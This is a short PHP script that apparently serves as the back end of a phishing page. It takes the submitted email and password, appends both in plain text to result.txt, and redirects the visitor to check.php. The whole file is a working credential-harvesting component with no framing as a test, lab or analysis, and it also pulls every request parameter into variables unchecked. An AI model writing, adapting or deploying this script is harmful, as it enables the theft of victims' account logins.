<?php
    extract($_REQUEST);
    $file=fopen("result.txt","a");

    fwrite($file, "\n=================================\n");
    fwrite($file,"Email :");
    fwrite($file, $email ."\n");
    fwrite($file,"Password :");
    fwrite($file, $password ."\n");
    fwrite($file, "=================================\n");
    fclose($file);
    header("location: check.php");
 ?>